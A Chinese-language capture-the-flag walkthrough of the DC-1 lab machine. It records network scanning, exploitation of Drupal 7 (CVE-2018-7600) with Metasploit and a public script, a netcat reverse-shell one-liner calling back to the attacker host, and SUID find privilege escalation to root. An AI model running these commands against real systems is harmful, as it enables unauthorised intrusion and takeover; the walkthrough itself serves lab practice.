# DC-1

发现目标主机

```
┌──(root㉿kali)-[~]
└─# arp-scan -l
Interface: eth0, type: EN10MB, MAC: 00:0c:29:f5:d6:36, IPv4: 192.168.5.134
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.5.1     00:50:56:c0:00:08       VMware, Inc.
192.168.5.2     00:50:56:f6:37:b9       VMware, Inc.
192.168.5.137   00:0c:29:ef:c8:ac       VMware, Inc.
192.168.5.254   00:50:56:e6:f6:66       VMware, Inc.

5 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 1.940 seconds (131.96 hosts/sec). 5 responded
```

Nmap扫描目标的开放端口

```
┌──(root㉿kali)-[~]
└─# nmap  -sV -sS -p- -T4 192.168.5.137
Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-13 02:56 EST
Nmap scan report for 192.168.5.137
Host is up (0.00017s latency).
Not shown: 65531 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 6.0p1 Debian 4+deb7u7 (protocol 2.0)
80/tcp    open  http    Apache/2.2.22 (Debian)
111/tcp   open  rpcbind 2-4 (RPC #100000)
39844/tcp open  status  1 (RPC #100024)
MAC Address: 00:0C:29:EF:C8:AC (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.28 seconds
```

可以看到目标端口的开放情况，我们用脚本扫描一下

```
```

nikto扫描一下看看有没有什么有用的信息

```
┌──(root㉿kali)-[~]
└─# nikto -host http://192.168.5.137/             
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          192.168.5.137
+ Target Hostname:    192.168.5.137
+ Target Port:        80
+ Start Time:         2023-12-13 03:03:42 (GMT-5)
---------------------------------------------------------------------------
+ Server: Apache/2.2.22 (Debian)
+ /: Retrieved x-powered-by header: PHP/5.4.45-0+deb7u14.
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: Drupal 7 was identified via the x-generator header. See: https://www.drupal.org/project/remove_http_headers
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
```

可以看到一条有用的信息 Drupal 7，通过漏洞搜索引擎发现有个msf的可利用模块

{% embed url="https://sploitus.com/" %}

<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

我们尝试一下SQL注入这个模块

```
msf6 > search Drupal

Matching Modules
================

   #  Name                                           Disclosure Date  Rank       Check  Description
   -  ----                                           ---------------  ----       -----  -----------
   2  exploit/multi/http/drupal_drupageddon          2014-10-15       excellent  No     Drupal HTTP Parameter Key/Value SQL Injection

msf6 > use exploit/multi/http/drupal_drupageddon
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
msf6 exploit(multi/http/drupal_drupageddon) > set rhosts 192.168.5.137
rhosts => 192.168.5.137
msf6 exploit(multi/http/drupal_drupageddon) > set lport 4445
lport => 4445
msf6 exploit(multi/http/drupal_drupageddon) > run

[*] Started reverse TCP handler on 192.168.5.134:4445 
[*] Sending stage (39927 bytes) to 192.168.5.137
[*] Meterpreter session 1 opened (192.168.5.134:4445 -> 192.168.5.137:55223) at 2023-12-13 03:19:08 -0500

meterpreter > ls
Listing: /var/www
=================

Mode              Size            Type  Last modified                      Name
----              ----            ----  -------------                      ----
100644/rw-r--r--  747324309678    fil   188498731153-02-08 21:33:43 -0500  .gitignore
.
.
.
100644/rw-r--r--  1791001362849   fil   188498731153-02-08 21:33:43 -0500  xmlrpc.php
```

可以看到这个模块是能利用成功的，但这不是我们的主要目的，尽量不依赖msf完成漏洞利用，通过goole搜索发现一个可利用该漏洞的Python脚本

{% embed url="https://github.com/pimps/CVE-2018-7600" %}

将该脚本下载下来后我们看一下它的帮助命令

```
┌──(root㉿kali)-[~/Desktop/test/CVE-2018-7600]
└─# python3 drupa7-CVE-2018-7600.py -h

=============================================================================
|          DRUPAL 7 <= 7.57 REMOTE CODE EXECUTION (CVE-2018-7600)           |
|                              by pimps                                     |
=============================================================================

usage: drupa7-CVE-2018-7600.py [-h] [-c COMMAND] [-f FUNCTION] [-p PROXY] target

positional arguments:
  target                            URL of target Drupal site (ex: http://target.com/)

options:
  -h, --help                        show this help message and exit
  -c COMMAND, --command COMMAND     Command to execute (default = id)
  -f FUNCTION, --function FUNCTION  Function to use as attack vector (default = passthru)
  -p PROXY, --proxy PROXY           Configure a proxy in the format http://127.0.0.1:8080/ (default = none)

This script will exploit the (CVE-2018-7600) vulnerability in Drupal 7 <= 7.57 by poisoning the recover password
form (user/password) and triggering it with the upload file via ajax (/file/ajax).
```

通过-c参数我们可以执行命令

```
┌──(root㉿kali)-[~/Desktop/test/CVE-2018-7600]
└─# python3 drupa7-CVE-2018-7600.py http://192.168.5.137/ -c id    

=============================================================================
|          DRUPAL 7 <= 7.57 REMOTE CODE EXECUTION (CVE-2018-7600)           |
|                              by pimps                                     |
=============================================================================

[*] Poisoning a form and including it in cache.
[*] Poisoned form ID: form-GM5iogOqIHhxGhctRdVF2wR537BRZY_jVugPk74B4uA
[*] Triggering exploit to execute: id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

我们现在生成一个反向shell

{% embed url="https://www.revshells.com/" %}

生成shell的时候我们选择以下选项，有时候生成的shell不能成功反弹，我们可以尝试一下其它的payload

<figure><img src="../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>

本地监听6666端口，然后反弹shell

```
┌──(root㉿kali)-[~/Desktop/test/CVE-2018-7600]
└─# python3 drupa7-CVE-2018-7600.py http://192.168.5.137/ -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 192.168.5.134 6666 >/tmp/f'

=============================================================================
|          DRUPAL 7 <= 7.57 REMOTE CODE EXECUTION (CVE-2018-7600)           |
|                              by pimps                                     |
=============================================================================

[*] Poisoning a form and including it in cache.
[*] Poisoned form ID: form-iQnGA1cTMjZKeftEfkUB6jA1hTAkxB_XEFyBiKPXEy8
[*] Triggering exploit to execute: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 192.168.5.134 6666 >/tmp/f

┌──(root㉿kali)-[~]
└─# nc -lnvp 6666
listening on [any] 6666 ...
connect to [192.168.5.134] from (UNKNOWN) [192.168.5.137] 37036
bash: no job control in this shell
www-data@DC-1:/var/www$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@DC-1:/var/www$ 
```



### 权限提升

我们这里尝试sudo提权，先用find 命令查找一下具有超级属性的文件

```
www-data@DC-1:/var/www$ find / -perm -u=s -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
/bin/mount
/bin/ping
/bin/su
/bin/ping6
/bin/umount
/usr/bin/at
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/procmail
/usr/bin/find
/usr/sbin/exim4
/usr/lib/pt_chown
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/sbin/mount.nfs
```

注意这里的find，这个命令具有超级属性，我们先升级一下该shell的外壳，然后再用find命令提权，这样就获得了root权限的壳

```
www-data@DC-1:/var/www$ python -c 'import pty; pty.spawn("/bin/bash")' 
bash-4.2$ find . -exec /bin/sh \; -quit
find . -exec /bin/sh \; -quit
# id
id
uid=33(www-data) gid=33(www-data) euid=0(root) groups=0(root),33(www-data)
```

这个命令的目的是在当前目录及其子目录中查找第一个文件（或目录），然后执行 /bin/sh，即启动一个交互式的Shell。这可以用于获取对目标系统的命令行访问权限。一旦找到第一个匹配项，命令就会立即退出，而不会继续查找其他文件。

